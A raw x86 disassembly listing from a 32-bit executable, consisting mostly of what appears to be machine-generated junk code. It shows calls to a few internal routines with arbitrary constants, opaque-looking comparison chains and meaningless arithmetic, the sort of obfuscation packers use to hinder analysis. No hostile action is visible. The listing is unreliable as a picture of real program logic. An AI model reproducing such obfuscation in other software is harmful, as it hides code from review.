  41a31d:	push   eax
  41a31e:	push   0x67
  41a320:	call   0x41c330
  41a325:	add    esp,0x8
  41a328:	push   edi
  41a329:	call   0x41c330
  41a32e:	add    esp,0x4
  41a331:	add    edi,esi
  41a333:	xor    ebx,ebx
  41a335:	mov    DWORD PTR [ebp-0x8],ebx
  41a338:	push   edi
  41a339:	push   0x18
  41a33b:	push   0x12e79400
  41a340:	push   0x3e426b00
  41a345:	push   0xffffffb4
  41a347:	call   0x41c72f
  41a34c:	add    esp,0x14
  41a34f:	push   0xbe79a200
  41a354:	push   0xbe448d00
  41a359:	push   edi
  41a35a:	push   0xffffffe2
  41a35c:	push   ebx
  41a35d:	call   0x41c13c
  41a362:	add    esp,0x14
  41a365:	and    ebx,eax
  41a367:	mov    edi,DWORD PTR [ebp-0x8]
  41a36a:	push   0x6f
  41a36c:	call   0x41c72f
  41a371:	add    esp,0x4
  41a374:	push   0x5e
  41a376:	push   eax
  41a377:	push   0x9209a600
  41a37c:	push   0x10c36d00
  41a381:	call   0x41c4c4
  41a386:	add    esp,0x10
  41a389:	mov    esi,0xe8
  41a38e:	add    esi,edi
  41a390:	push   0x27
  41a392:	push   0x1a
  41a394:	push   0x8e52fe00
  41a399:	push   0xffffff93
  41a39b:	call   0x41c20f
  41a3a0:	add    esp,0x10
  41a3a3:	push   0x4a
  41a3a5:	push   0xffffffea
  41a3a7:	push   0xaa3f3f00
  41a3ac:	push   0xa645ba00
  41a3b1:	push   eax
  41a3b2:	call   0x41c5c5
  41a3b7:	add    esp,0x14
  41a3ba:	push   0x5f
  41a3bc:	call   0x41c4c4
  41a3c1:	add    esp,0x4
  41a3c4:	cmp    esi,0xffffffdd
  41a3c7:	jne    0x41a3d0
  41a3c9:	and    ebx,esi
  41a3cb:	sub    ebx,esi
  41a3cd:	sub    DWORD PTR [ebp-0x8],ebx
  41a3d0:	push   esi
  41a3d1:	push   0xa66ec00
  41a3d6:	push   0xa0e79500
  41a3db:	call   0x41c5c5
  41a3e0:	add    esp,0xc
  41a3e3:	push   0x1
  41a3e5:	push   ebx
  41a3e6:	push   ebx
  41a3e7:	push   eax
  41a3e8:	push   0x2277d00
  41a3ed:	call   0x41c20f
  41a3f2:	add    esp,0x14
  41a3f5:	push   ebx
  41a3f6:	push   eax
  41a3f7:	push   0x2c
  41a3f9:	call   0x41c20f
  41a3fe:	add    esp,0xc
  41a401:	and    edi,ebx
  41a403:	push   ebx
  41a404:	call   0x41c13c
  41a409:	add    esp,0x4
  41a40c:	sub    DWORD PTR [ebp-0x8],edi
  41a40f:	push   eax
  41a410:	push   edi
  41a411:	push   edi
  41a412:	call   0x41c13c
  41a417:	add    esp,0xc
  41a41a:	push   ebx
  41a41b:	push   0xda103700
  41a420:	push   0x6a
  41a422:	push   eax
  41a423:	call   0x41c5c5
  41a428:	add    esp,0x10
  41a42b:	call   0x41c330
  41a430:	push   edi
  41a431:	push   ebx
  41a432:	push   0xffffff81
  41a434:	push   0x645ca00
  41a439:	call   0x41c330
  41a43e:	add    esp,0x10
  41a441:	push   0x20d35e00
  41a446:	push   0xe364200
  41a44b:	push   0xf3e900
  41a450:	push   0x4af29b00
  41a455:	push   0x46
  41a457:	call   0x41c72f
  41a45c:	add    esp,0x14
  41a45f:	push   eax
  41a460:	call   0x41c5c5
  41a465:	add    esp,0x4
  41a468:	push   esi
  41a469:	push   0x31
  41a46b:	push   eax
  41a46c:	push   eax
  41a46d:	call   0x41c5c5
  41a472:	add    esp,0x10
  41a475:	push   0x68
  41a477:	call   0x41c72f
  41a47c:	add    esp,0x4
  41a47f:	push   edi
  41a480:	push   eax
  41a481:	push   eax
  41a482:	push   0xe09e5f00
  41a487:	call   0x41c4c4
  41a48c:	add    esp,0x10
  41a48f:	push   0xb2a99300
  41a494:	push   0x4b
  41a496:	push   0x23
  41a498:	push   edi
  41a499:	push   0xffffffd6
  41a49b:	call   0x41c13c
  41a4a0:	add    esp,0x14
  41a4a3:	push   0x424074
  41a4a8:	call   DWORD PTR ds:0x4219d4
  41a4ae:	test   esi,0x58
  41a4b4:	jne    0x41a4c4
  41a4b6:	test   ebx,0xa6ff
  41a4bc:	jne    0x41a4c4
  41a4be:	mov    esi,DWORD PTR [ebp-0x8]
  41a4c1:	or     DWORD PTR [ebp-0x8],esi
  41a4c4:	cmp    eax,DWORD PTR ds:0x424074
  41a4ca:	je     0x41a738
  41a4d0:	and    eax,edi
  41a4d2:	add    eax,esi
  41a4d4:	push   0xd67cba00
  41a4d9:	push   0xea5fb500
  41a4de:	call   0x41c20f
  41a4e3:	add    esp,0x8
  41a4e6:	push   0xffffff83
  41a4e8:	push   0x4a
  41a4ea:	push   edi
  41a4eb:	call   0x41c330
  41a4f0:	add    esp,0xc
  41a4f3:	mov    edx,0x21
  41a4f8:	mov    ebx,edx
  41a4fa:	xor    DWORD PTR [ebp-0x8],ebx
  41a4fd:	mov    eax,DWORD PTR [ebp-0x8]
  41a500:	sub    eax,esi
  41a502:	add    eax,esi
  41a504:	mov    esi,DWORD PTR [ebp-0x8]
  41a507:	sub    esi,ebx
  41a509:	and    eax,edx
  41a50b:	cmp    esi,DWORD PTR ds:0x424074
  41a511:	jne    0x41a5dc
  41a517:	add    DWORD PTR [ebp-0x8],eax
  41a51a:	cmp    esi,0xffffffe9
  41a51d:	jne    0x41a5dc
  41a523:	mov    DWORD PTR [ebp-0x8],eax
  41a526:	cmp    esi,0xffffffb8
  41a529:	jne    0x41a5dc
  41a52f:	cmp    esi,DWORD PTR ds:0x4240a4
  41a535:	je     0x41a5dc
  41a53b:	sub    esi,edx
  41a53d:	mov    eax,0x36
  41a542:	mov    ebx,0xf13d
  41a547:	add    ebx,esi
  41a549:	add    ebx,eax
  41a54b:	cmp    ebx,0x13d7
  41a551:	jne    0x41a5dc
  41a557:	mov    ecx,DWORD PTR [ebp-0x8]
  41a55a:	and    DWORD PTR [ebp-0x8],ecx
  41a55d:	mov    ecx,DWORD PTR [ebp-0x8]
  41a560:	add    DWORD PTR [ebp-0x8],ebx
  41a563:	add    DWORD PTR [ebp-0x8],edi
  41a566:	add    ecx,ecx
  41a568:	or     ecx,edx
  41a56a:	add    ecx,ecx
  41a56c:	cmp    ecx,0x52
  41a56f:	jne    0x41a5dc
  41a571:	mov    edi,DWORD PTR [ebp-0x8]
  41a574:	sub    ecx,edi
  41a576:	mov    edi,DWORD PTR [ebp-0x8]
  41a579:	sub    DWORD PTR [ebp-0x8],eax
  41a57c:	add    edi,edi
  41a57e:	mov    DWORD PTR [ebp-0x8],ecx
  41a581:	add    edi,eax
  41a583:	or     edi,edx
  41a585:	cmp    ebx,edi
  41a587:	jne    0x41a5dc
  41a589:	sub    edi,ecx
  41a58b:	mov    esi,DWORD PTR [ebp-0x8]
  41a58e:	mov    ebx,DWORD PTR [ebp-0x8]
  41a591:	add    edi,esi
  41a593:	add    DWORD PTR [ebp-0x8],ecx
  41a596:	cmp    edi,DWORD PTR [ebp-0xc]
  41a599:	jne    0x41a5dc
  41a59b:	cmp    ebx,DWORD PTR ds:0x42409c
  41a5a1:	je     0x41a5dc
  41a5a3:	sub    edi,eax
  41a5a5:	add    DWORD PTR [ebp-0x8],ecx
  41a5a8:	mov    esi,DWORD PTR ds:0x424074
  41a5ae:	mov    ecx,DWORD PTR ds:0x42409c
  41a5b4:	sub    ecx,edi
  41a5b6:	or     DWORD PTR [ebp-0x8],ebx
  41a5b9:	add    DWORD PTR [ebp-0x8],edi
  41a5bc:	cmp    ecx,DWORD PTR ds:0x424074
  41a5c2:	je     0x41a5dc
  41a5c4:	or     esi,ecx
  41a5c6:	mov    ecx,0xd5
  41a5cb:	or     DWORD PTR [ebp-0x8],esi
  41a5ce:	mov    esi,edx
  41a5d0:	add    ecx,esi
  41a5d2:	sub    DWORD PTR [ebp-0x8],ebx
  41a5d5:	add    ecx,esi
  41a5d7:	sub    ecx,edx
  41a5d9:	mov    DWORD PTR [ebp-0x4],ecx
  41a5dc:	xor    esi,esi
  41a5de:	mov    ebx,DWORD PTR [ebp-0x8]
  41a5e1:	mov    eax,0x9319
  41a5e6:	cmp    ebx,0x5f4b
  41a5ec:	je     0x41a60f
  41a5ee:	xor    DWORD PTR [ebp-0x8],ebx
  41a5f1:	mov    edi,DWORD PTR [ebp-0x8]
  41a5f4:	sub    edi,ebx
  41a5f6:	mov    ebx,DWORD PTR [ebp-0x8]
  41a5f9:	add    DWORD PTR [ebp-0x8],ecx
  41a5fc:	add    edi,ecx
  41a5fe:	add    DWORD PTR [ebp-0x8],edi
  41a601:	sub    DWORD PTR [ebp-0x8],ebx
  41a604:	test   ebx,0x2c
  41a60a:	je     0x41a60f
  41a60c:	sub    DWORD PTR [ebp-0x8],eax
  41a60f:	or     ecx,edi
  41a611:	xor    edi,edi
  41a613:	or     edi,eax
  41a615:	mov    ebx,DWORD PTR [ebp-0x8]
  41a618:	sub    ecx,ebx
  41a61a:	and    ecx,esi
  41a61c:	add    DWORD PTR [ebp-0x8],eax
  41a61f:	and    ecx,esi
  41a621:	sub    edi,eax
  41a623:	add    edi,ecx
  41a625:	cmp    ebx,DWORD PTR [ebp-0x30]
  41a628:	je     0x41a6e7
  41a62e:	cmp    ecx,edi
  41a630:	jne    0x41a6e7
  41a636:	xor    DWORD PTR [ebp-0x8],ecx
  41a639:	add    edi,esi
  41a63b:	test   edi,0xc7c5
  41a641:	je     0x41a6e7
  41a647:	cmp    edi,0xffffffe9
  41a64a:	je     0x41a6e7
  41a650:	mov    ecx,eax
  41a652:	mov    eax,0x96
  41a657:	cmp    edi,DWORD PTR ds:0x4240a4
  41a65d:	je     0x41a6e7
  41a663:	sub    DWORD PTR [ebp-0x8],edx
  41a666:	add    edi,eax
  41a668:	cmp    edi,DWORD PTR ds:0x4240a4
  41a66e:	jne    0x41a6e7
  41a670:	and    ecx,edx
  41a672:	mov    ebx,DWORD PTR [ebp-0x8]
  41a675:	xor    eax,eax
  41a677:	test   ebx,0x28
  41a67d:	je     0x41a6e7
  41a67f:	sub    edi,edx
  41a681:	add    ebx,ebx
  41a683:	sub    ecx,ebx
  41a685:	sub    DWORD PTR [ebp-0x8],ecx
  41a688:	add    DWORD PTR [ebp-0x8],edi
  41a68b:	sub    edi,edx
  41a68d:	and    eax,edx
  41a68f:	and    edi,esi
  41a691:	or     eax,ecx
  41a693:	or     DWORD PTR [ebp-0x8],eax
  41a696:	cmp    edi,DWORD PTR ds:0x42409c
  41a69c:	je     0x41a6e7
  41a69e:	and    edi,eax
  41a6a0:	and    edi,ecx
  41a6a2:	mov    eax,DWORD PTR [ebp-0x8]
  41a6a5:	mov    ebx,edi
  41a6a7:	test   eax,0xc0
  41a6ac:	jne    0x41a6e7
  41a6ae:	sub    DWORD PTR [ebp-0x8],ebx
  41a6b1:	mov    ecx,DWORD PTR [ebp-0x8]
  41a6b4:	cmp    eax,0x4d52
  41a6b9:	je     0x41a6e7
  41a6bb:	mov    ebx,DWORD PTR [ebp-0x8]
  41a6be:	cmp    eax,0x41
  41a6c1:	jne    0x41a6e7
  41a6c3:	cmp    eax,0xffffffe5
  41a6c6:	je     0x41a6e7
  41a6c8:	sub    DWORD PTR [ebp-0x8],eax
  41a6cb:	sub    DWORD PTR [ebp-0x8],ecx
  41a6ce:	mov    eax,DWORD PTR [ebp-0x8]
  41a6d1:	add    DWORD PTR [ebp-0x8],eax
  41a6d4:	mov    eax,DWORD PTR [ebp-0x8]
  41a6d7:	xor    DWORD PTR [ebp-0x8],ebx
  41a6da:	cmp    ebx,DWORD PTR [ebp-0x54]
  41a6dd:	jne    0x41a6e7
  41a6df:	cmp    eax,0xffffff97
  41a6e2:	je     0x41a6e7
  41a6e4:	add    DWORD PTR [ebp-0x8],eax
  41a6e7:	mov    DWORD PTR [ebp-0xc],edx
  41a6ea:	push   eax
  41a6eb:	push   0x329d2000
  41a6f0:	push   0x8afd5800
  41a6f5:	push   edx
  41a6f6:	call   0x41c4c4
  41a6fb:	add    esp,0x10
  41a6fe:	call   0x41c330
  41a703:	or     DWORD PTR [ebp-0x8],edi
  41a706:	push   0x49
  41a708:	push   esi
  41a709:	push   0x12
  41a70b:	push   0xc0f07600
  41a710:	push   0x3c
  41a712:	call   0x41c5c5
  41a717:	add    esp,0x14
  41a71a:	sub    DWORD PTR [ebp-0xc],esi
  41a71d:	push   0x12bf4b00
  41a722:	call   0x41c330
  41a727:	add    esp,0x4
  41a72a:	push   0x1c
  41a72c:	push   eax
  41a72d:	push   0xffffff9e
  41a72f:	push   eax
  41a730:	call   0x41c20f
  41a735:	add    esp,0x10
  41a738:	mov    esi,0x4e77
  41a73d:	mov    edx,eax
  41a73f:	push   0xffffff81
  41a741:	push   0x6e076e00
  41a746:	push   ebx
  41a747:	call   0x41c20f
  41a74c:	add    esp,0xc
  41a74f:	push   0x25
  41a751:	call   0x41c5c5
  41a756:	add    esp,0x4
  41a759:	push   0xca8c9200
  41a75e:	push   0x12a3c000
  41a763:	push   0x760e1a00
  41a768:	push   0xa6706800
  41a76d:	call   0x41c13c
  41a772:	add    esp,0x10
  41a775:	push   esi
  41a776:	push   0x50e6a000
  41a77b:	call   0x41c330
  41a780:	add    esp,0x8
  41a783:	and    esi,ebx
  41a785:	mov    edi,0xb
  41a78a:	push   0x10f23900
  41a78f:	push   esi
  41a790:	push   0x54
  41a792:	call   0x41c330
  41a797:	add    esp,0xc
  41a79a:	add    DWORD PTR [ebp-0x8],edi
  41a79d:	push   0x4240a4
  41a7a2:	call   DWORD PTR ds:0x4219c4
  41a7a8:	mov    edi,DWORD PTR [ebp-0x8]
  41a7ab:	cmp    edi,DWORD PTR [ebp-0x30]
  41a7ae:	je     0x41a7b8
  41a7b0:	add    edi,ebx
  41a7b2:	xor    DWORD PTR [ebp-0x8],esi
  41a7b5:	add    DWORD PTR [ebp-0x8],edi
  41a7b8:	cmp    eax,DWORD PTR [ebp-0xc]
  41a7bb:	jne    0x41a8a1
  41a7c1:	mov    edi,0x90
  41a7c6:	call   0x41c330
  41a7cb:	mov    ebx,eax
  41a7cd:	add    DWORD PTR [ebp-0x8],ebx
  41a7d0:	push   0x1a41cf00
  41a7d5:	push   0x7a1cbd00
  41a7da:	push   esi
  41a7db:	call   0x41c72f
  41a7e0:	add    esp,0xc
  41a7e3:	push   esi
  41a7e4:	push   ebx
  41a7e5:	push   0x1b
  41a7e7:	push   0xffffffcc
  41a7e9:	call   0x41c4c4
  41a7ee:	add    esp,0x10
  41a7f1:	add    DWORD PTR [ebp-0x8],edi
  41a7f4:	mov    edx,DWORD PTR ds:0x42409c
  41a7fa:	mov    ecx,DWORD PTR [ebp-0x8]
  41a7fd:	mov    ebx,DWORD PTR [ebp-0x8]
  41a800:	or     DWORD PTR [ebp-0x8],edx
  41a803:	add    ecx,edx
  41a805:	test   ebx,0x5b
  41a80b:	je     0x41a857
  41a80d:	mov    esi,edi
  41a80f:	mov    eax,DWORD PTR [ebp-0x8]
  41a812:	add    eax,eax
  41a814:	sub    DWORD PTR [ebp-0x8],edx
  41a817:	add    DWORD PTR [ebp-0x8],ebx
  41a81a:	add    DWORD PTR [ebp-0x8],ecx
  41a81d:	cmp    ebx,DWORD PTR ds:0x4240a4
  41a823:	je     0x41a857
  41a825:	sub    eax,edx
  41a827:	sub    DWORD PTR [ebp-0x8],eax
  41a82a:	and    DWORD PTR [ebp-0x8],edx
  41a82d:	mov    edi,esi
  41a82f:	add    edi,ebx
  41a831:	mov    ecx,0xb71a
  41a836:	add    edi,ecx
  41a838:	and    DWORD PTR [ebp-0x8],ecx
  41a83b:	add    edi,edx
  41a83d:	add    DWORD PTR [ebp-0x8],ecx
  41a840:	add    edi,edx
  41a842:	cmp    edi,DWORD PTR ds:0x424074
  41a848:	je     0x41a857
  41a84a:	sub    edi,ecx
  41a84c:	mov    ebx,0xda
  41a851:	sub    DWORD PTR [ebp-0x8],ebx
  41a854:	sub    DWORD PTR [ebp-0x8],edi
  41a857:	sub    DWORD PTR [ebp-0x8],esi
  41a85a:	xor    eax,eax
  41a85c:	sub    ecx,esi
  41a85e:	sub    DWORD PTR [ebp-0x8],ecx
  41a861:	and    DWORD PTR [ebp-0x8],eax
  41a864:	or     edx,eax
  41a866:	add    ebx,ecx
  41a868:	xor    eax,eax
  41a86a:	mov    esi,DWORD PTR [ebp-0x8]
  41a86d:	sub    esi,ebx
  41a86f:	mov    DWORD PTR [ebp-0x8],edx
  41a872:	add    DWORD PTR [ebp-0x8],eax
  41a875:	sub    DWORD PTR [ebp-0x8],esi
  41a878:	mov    ecx,DWORD PTR [ebp-0x8]
  41a87b:	sub    DWORD PTR [ebp-0x8],ecx
  41a87e:	mov    DWORD PTR [ebp-0x54],edx
  41a881:	push   eax
  41a882:	push   ecx
  41a883:	push   eax
  41a884:	push   0xffffffdd
  41a886:	call   0x41c72f
  41a88b:	add    esp,0x10
  41a88e:	push   edx
  41a88f:	push   0x24
  41a891:	push   0x90b96100
  41a896:	push   0x22
  41a898:	push   edx
  41a899:	call   0x41c13c
  41a89e:	add    esp,0x14
  41a8a1:	sub    eax,edi
  41a8a3:	cmp    eax,0x57
  41a8a6:	je     0x41a8b9
  41a8a8:	push   esi
  41a8a9:	push   0xfffffffd
  41a8ab:	push   edi
  41a8ac:	push   0x7264a500
  41a8b1:	call   0x41c330
  41a8b6:	add    esp,0x10
  41a8b9:	push   ebx
  41a8ba:	push   0x63
  41a8bc:	push   esi
  41a8bd:	push   0xaa6eb600
  41a8c2:	push   0xffffffbd
  41a8c4:	call   0x41c20f
  41a8c9:	add    esp,0x14
  41a8cc:	push   0x760c5300
  41a8d1:	call   0x41c330
  41a8d6:	add    esp,0x4
  41a8d9:	call   DWORD PTR ds:0x4219fc
  41a8df:	add    DWORD PTR [ebp-0x8],esi
  41a8e2:	mov    DWORD PTR [ebp-0x2c],eax
  41a8e5:	call   0x41c13c
  41a8ea:	call   0x41c330
  41a8ef:	push   0x15
  41a8f1:	push   0x0
  41a8f3:	call   DWORD PTR ds:0x4219c8
  41a8f9:	mov    esi,DWORD PTR [ebp-0x8]
  41a8fc:	mov    edi,DWORD PTR ds:0x424094
  41a902:	sub    esi,edi
  41a904:	add    esi,ebx
  41a906:	mov    DWORD PTR [ebp-0x8],esi
  41a909:	cmp    eax,0xffffffbd
  41a90c:	jne    0x41a97c
  41a90e:	sub    DWORD PTR [ebp-0x8],eax
  41a911:	push   0xffffff8e
  41a913:	call   0x41c330
  41a918:	add    esp,0x4
  41a91b:	mov    ecx,0x65
  41a920:	add    DWORD PTR [ebp-0x8],eax
  41a923:	mov    ebx,DWORD PTR [ebp-0x8]
  41a926:	mov    esi,DWORD PTR [ebp-0x8]
  41a929:	sub    DWORD PTR [ebp-0x8],esi
  41a92c:	sub    ebx,eax
  41a92e:	test   ebx,0x6742
  41a934:	je     0x41a96c
  41a936:	mov    edx,DWORD PTR [ebp-0x8]
  41a939:	mov    esi,0x92318148
  41a93e:	or     edx,ecx
  41a940:	sub    esi,ebx
  41a942:	add    DWORD PTR [ebp-0x8],edx
  41a945:	sub    esi,edi
  41a947:	cmp    esi,0xfffffff1
  41a94a:	jne    0x41a96c
  41a94c:	sub    esi,ebx
  41a94e:	mov    eax,DWORD PTR ds:0x424074
  41a954:	mov    edi,DWORD PTR [ebp-0x8]
  41a957:	sub    DWORD PTR [ebp-0x8],eax
  41a95a:	add    edi,edi
  41a95c:	add    edi,esi
  41a95e:	or     DWORD PTR [ebp-0x8],ebx
  41a961:	mov    DWORD PTR [ebp-0x24],eax
  41a964:	cmp    edi,0x5c
  41a967:	je     0x41a96c
  41a969:	add    DWORD PTR [ebp-0x24],edi
  41a96c:	mov    DWORD PTR [ebp-0x1c],ecx
  41a96f:	push   0xca2f0600
  41a974:	call   0x41c13c
  41a979:	add    esp,0x4
  41a97c:	and    esi,edi
  41a97e:	add    DWORD PTR [ebp-0x8],ebx
  41a981:	cmp    esi,DWORD PTR ds:0x4240a4
  41a987:	je     0x41a9e8
  41a989:	push   0xffffffab
  41a98b:	call   0x41c4c4
  41a990:	add    esp,0x4
  41a993:	add    esi,esi
  41a995:	mov    edi,DWORD PTR [ebp-0x8]
  41a998:	add    edi,eax
  41a99a:	xor    DWORD PTR [ebp-0x8],esi
  41a99d:	push   0x7a2dcb00
  41a9a2:	push   0x42489300
  41a9a7:	call   0x41c72f
  41a9ac:	add    esp,0x8
  41a9af:	push   0x8e7c1100
  41a9b4:	push   0x464c3200
  41a9b9:	call   0x41c72f
  41a9be:	add    esp,0x8
  41a9c1:	push   0x20dc4b00
  41a9c6:	call   0x41c72f
  41a9cb:	add    esp,0x4
  41a9ce:	sub    edi,ebx
  41a9d0:	push   0xffffffed
  41a9d2:	call   0x41c5c5
  41a9d7:	add    esp,0x4
  41a9da:	call   0x41c72f
  41a9df:	push   edi
  41a9e0:	call   0x41c4c4
  41a9e5:	add    esp,0x4
  41a9e8:	sub    DWORD PTR [ebp-0x8],eax
  41a9eb:	push   0xffffffee
  41a9ed:	push   0xffffff85
  41a9ef:	push   0xda5e7300
  41a9f4:	push   0xffffffa3
  41a9f6:	push   0xd6500700
  41a9fb:	call   0x41c4c4
  41aa00:	add    esp,0x14
  41aa03:	push   0xe
  41aa05:	push   eax
  41aa06:	call   0x41c13c
  41aa0b:	add    esp,0x8
  41aa0e:	mov    ecx,0xdb
  41aa13:	mov    esi,DWORD PTR [ebp-0x8]
  41aa16:	call   0x41c72f
  41aa1b:	push   0xa8b2500
  41aa20:	push   0xffffffc3
  41aa22:	push   0xffffffef
  41aa24:	push   0x6a0a6900
  41aa29:	call   0x41c4c4
  41aa2e:	add    esp,0x10
  41aa31:	push   0xffffffef
  41aa33:	call   0x41c4c4
  41aa38:	add    esp,0x4
  41aa3b:	push   edi
  41aa3c:	push   0x12ec3800
  41aa41:	call   0x41c13c
  41aa46:	add    esp,0x8
  41aa49:	push   0x49
  41aa4b:	push   0xffffffec
  41aa4d:	push   edi
  41aa4e:	push   0xa0f60800
  41aa53:	call   0x41c330
  41aa58:	add    esp,0x10
  41aa5b:	push   0x70b88d00
  41aa60:	push   0x121a3200
  41aa65:	push   0x2408f00
  41aa6a:	push   edi
  41aa6b:	push   0xffffffe8
  41aa6d:	call   0x41c5c5
  41aa72:	add    esp,0x14
  41aa75:	push   ebx
  41aa76:	push   ebx
  41aa77:	call   0x41c330
  41aa7c:	add    esp,0x8
  41aa7f:	push   edi
  41aa80:	push   0xffffff8d
  41aa82:	push   ebx
  41aa83:	push   0xffffffc0
  41aa85:	call   0x41c4c4
  41aa8a:	add    esp,0x10
  41aa8d:	or     DWORD PTR [ebp-0x8],esi
  41aa90:	push   0xfffffff1
  41aa92:	push   0xffffffbe
  41aa94:	push   0xf0873700
  41aa99:	call   0x41c4c4
  41aa9e:	add    esp,0xc
  41aaa1:	push   0x5e6a8700
  41aaa6:	call   0x41c5c5
  41aaab:	add    esp,0x4
  41aaae:	and    eax,ebx
  41aab0:	push   0xcac8a800
  41aab5:	push   eax
  41aab6:	push   0x8a434a00
  41aabb:	push   eax
  41aabc:	push   0x20
  41aabe:	call   0x41c13c
  41aac3:	add    esp,0x14
  41aac6:	call   0x41c72f
  41aacb:	push   0xffffffa1
  41aacd:	push   0x2c
  41aacf:	call   0x41c72f
  41aad4:	add    esp,0x8
  41aad7:	mov    edi,DWORD PTR ds:0x424090
  41aadd:	push   ebx
  41aade:	push   esi
  41aadf:	push   0xffffffca
  41aae1:	push   0xffffffd9
  41aae3:	call   0x41c72f
  41aae8:	add    esp,0x10
  41aaeb:	mov    edx,DWORD PTR [ebp-0x8]
  41aaee:	sub    DWORD PTR [ebp-0x8],edx
  41aaf1:	push   0x76
  41aaf3:	push   eax
  41aaf4:	push   0xffffffe2
  41aaf6:	push   edx
  41aaf7:	push   edi
  41aaf8:	call   0x41c330
  41aafd:	add    esp,0x14
  41ab00:	mov    edi,0xf1
  41ab05:	mov    edx,DWORD PTR [ebp-0x8]
  41ab08:	push   esi
  41ab09:	push   0xa54ad00
  41ab0e:	push   0xffffff8c
  41ab10:	call   0x41c13c
  41ab15:	add    esp,0xc
  41ab18:	push   0x6e64ba00
  41ab1d:	push   edi
  41ab1e:	push   0x16
  41ab20:	push   ebx
  41ab21:	call   0x41c13c
  41ab26:	add    esp,0x10
  41ab29:	push   ebx
  41ab2a:	call   0x41c4c4
  41ab2f:	add    esp,0x4
  41ab32:	push   edi
  41ab33:	call   0x41c5c5
  41ab38:	add    esp,0x4
  41ab3b:	call   0x41c330
  41ab40:	call   0x41c72f
  41ab45:	xor    DWORD PTR [ebp-0x8],ebx
  41ab48:	call   0x41c20f
  41ab4d:	push   0xde418200
  41ab52:	push   0xc09fbf00
  41ab57:	call   0x41c13c
  41ab5c:	add    esp,0x8
  41ab5f:	push   esi
  41ab60:	push   esi
  41ab61:	push   0xffffffdd
  41ab63:	push   0x72
  41ab65:	call   0x41c20f
  41ab6a:	add    esp,0x10
  41ab6d:	mov    edx,0xaa
  41ab72:	sub    DWORD PTR [ebp-0x8],edx
  41ab75:	push   0x425e1200
  41ab7a:	push   eax
  41ab7b:	push   esi
  41ab7c:	push   0x60b5d100
  41ab81:	call   0x41c20f
  41ab86:	add    esp,0x10
  41ab89:	add    DWORD PTR [ebp-0x8],eax
  41ab8c:	push   eax
  41ab8d:	push   0x54
  41ab8f:	push   0x8089f400
  41ab94:	push   0xffffffa0
  41ab96:	push   0xfffffff8
  41ab98:	call   0x41c330
  41ab9d:	add    esp,0x14
  41aba0:	push   edi
  41aba1:	push   0x663a0b00
  41aba6:	push   0xffffffbe
  41aba8:	call   0x41c4c4
  41abad:	add    esp,0xc
  41abb0:	sub    DWORD PTR [ebp-0x8],eax
  41abb3:	mov    edx,ebx
  41abb5:	mov    ebx,DWORD PTR [ebp-0x8]
  41abb8:	push   0xffffffb1
  41abba:	push   0xf0f06900
  41abbf:	call   0x41c20f
  41abc4:	add    esp,0x8
  41abc7:	push   eax
  41abc8:	push   0x12d98c00
  41abcd:	push   0x29
  41abcf:	push   0x66
  41abd1:	call   0x41c4c4
  41abd6:	add    esp,0x10
  41abd9:	push   ebx
  41abda:	push   0x32b53500
  41abdf:	push   edi
  41abe0:	call   0x41c330
  41abe5:	add    esp,0xc
  41abe8:	push   ebx
  41abe9:	call   0x41c72f
  41abee:	add    esp,0x4
  41abf1:	sub    eax,ebx
  41abf3:	call   0x41c72f
  41abf8:	call   0x41c5c5
  41abfd:	xor    esi,esi
  41abff:	mov    eax,DWORD PTR [ebp-0x8]
  41ac02:	call   0x41c72f
  41ac07:	sub    DWORD PTR [ebp-0x8],esi
  41ac0a:	push   0x10
  41ac0c:	push   0xffffffdd
  41ac0e:	push   esi
  41ac0f:	call   0x41c5c5
  41ac14:	add    esp,0xc
  41ac17:	push   0x7a
  41ac19:	push   0xffffffbc
  41ac1b:	push   eax
  41ac1c:	push   0xca8f3a00
  41ac21:	push   edi
  41ac22:	call   0x41c72f
  41ac27:	add    esp,0x14
  41ac2a:	push   eax
  41ac2b:	push   eax
  41ac2c:	push   0xffffffad
  41ac2e:	push   ebx
  41ac2f:	push   ebx
  41ac30:	call   0x41c4c4
  41ac35:	add    esp,0x14
  41ac38:	push   ebx
  41ac39:	call   0x41c13c
  41ac3e:	add    esp,0x4
  41ac41:	lea    ecx,[ebp-0x48]
  41ac44:	cmp    ecx,DWORD PTR ds:0x424094
  41ac4a:	je     0x41ac4f
  41ac4c:	sub    DWORD PTR [ebp-0x8],ecx
  41ac4f:	xor    edx,edx
  41ac51:	mov    eax,DWORD PTR [ebp-0x8]
  41ac54:	add    eax,edx
  41ac56:	cmp    eax,DWORD PTR [ebp-0x20]
  41ac59:	jne    0x41adc2
  41ac5f:	sub    eax,ebx
  41ac61:	mov    esi,DWORD PTR [ebp-0x8]
  41ac64:	mov    edi,DWORD PTR [ebp-0x8]
  41ac67:	cmp    eax,edx
  41ac69:	je     0x41adc2
  41ac6f:	mov    edx,DWORD PTR [ebp-0x8]
  41ac72:	mov    ebx,DWORD PTR [ebp-0x8]
  41ac75:	add    ebx,ebx
  41ac77:	cmp    edx,DWORD PTR ds:0x4240a4
  41ac7d:	je     0x41adc2
  41ac83:	cmp    edi,0x26
  41ac86:	jne    0x41adc2
  41ac8c:	and    DWORD PTR [ebp-0x8],esi
  41ac8f:	mov    esi,DWORD PTR [ebp-0x8]
  41ac92:	cmp    eax,DWORD PTR [ebp-0x10]
  41ac95:	jne    0x41adc2
  41ac9b:	sub    DWORD PTR [ebp-0x8],esi
  41ac9e:	mov    esi,0x4
  41aca3:	sub    ebx,edi
  41aca5:	xor    edi,edi
  41aca7:	sub    eax,edi
  41aca9:	and    eax,ecx
  41acab:	xor    DWORD PTR [ebp-0x8],eax
  41acae:	add    edx,eax
  41acb0:	cmp    ebx,DWORD PTR [ebp-0x28]
  41acb3:	jne    0x41adc2
  41acb9:	mov    eax,0xa6
  41acbe:	sub    DWORD PTR [ebp-0x8],ecx
  41acc1:	sub    edx,edi
  41acc3:	mov    edi,DWORD PTR [ebp-0x8]
  41acc6:	and    esi,edi
  41acc8:	sub    DWORD PTR [ebp-0x8],ebx
  41accb:	cmp    esi,DWORD PTR [ebp-0x4c]
  41acce:	je     0x41adc2
  41acd4:	cmp    edx,DWORD PTR [ebp-0x2c]
  41acd7:	jne    0x41adc2
  41acdd:	mov    eax,DWORD PTR [ebp-0x8]
  41ace0:	xor    edi,edi
  41ace2:	cmp    eax,ebx
  41ace4:	je     0x41adc2
  41acea:	mov    ebx,DWORD PTR [ebp-0x8]
  41aced:	add    DWORD PTR [ebp-0x8],ecx
  41acf0:	cmp    eax,0x31
  41acf3:	je     0x41adc2
  41acf9:	sub    eax,edi
  41acfb:	add    esi,edx
  41acfd:	add    eax,edi
  41acff:	mov    edi,0xae
